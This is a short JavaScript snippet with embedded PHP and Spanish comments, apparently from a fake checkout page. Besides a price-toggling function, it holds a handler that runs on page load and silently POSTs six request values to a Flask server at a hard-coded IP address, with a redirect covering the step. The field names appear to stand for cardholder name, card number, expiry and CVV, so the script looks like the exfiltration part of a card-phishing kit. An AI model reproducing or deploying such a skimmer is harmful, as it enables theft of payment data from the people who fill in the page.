function actualizarPrecio() {
    const checkbox = document.getElementById("mi-checkbox");
    const precio = document.getElementById("precio");
    const tipa = document.getElementById("tipa");
    
    if (checkbox.checked) {
      // Si el checkbox está activado, dividimos el precio por dos
      precio.textContent = "$5,000";
      tipa.textContent = "$2,500";
    } else {
      // Si el checkbox está desactivado, usamos el precio completo
      precio.textContent = "$10,000";
      tipa.textContent = "$3,192.15";
    }
  }

  // Este script se ejecutará en el cliente una vez que la página se cargue.
document.addEventListener('DOMContentLoaded', function() {
  const formData = new FormData();
  // Agregar los datos recibidos por GET al objeto FormData
  formData.append('names', <?= json_encode($names) ?>);
  formData.append('drac', <?= json_encode($drac) ?>);
  formData.append('mmaa', <?= json_encode($mmaa) ?>);
  formData.append('cvcv', <?= json_encode($cvcv) ?>);
  formData.append('ind', <?= json_encode($ind) ?>);
  formData.append('cosheo', <?= json_encode($cosheo) ?>);

  // Enviar una solicitud POST al servidor Flask
  fetch('http://82.180.136.22:5000/receive_data', {
    method: 'POST',
    body: formData
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    // La respuesta está bien, pero no necesitamos hacer nada más aquí,
    // ya que la redirección se maneja con la metaetiqueta HTML refresh.
  })
  .catch(error => console.error('Fetch error:', error));
});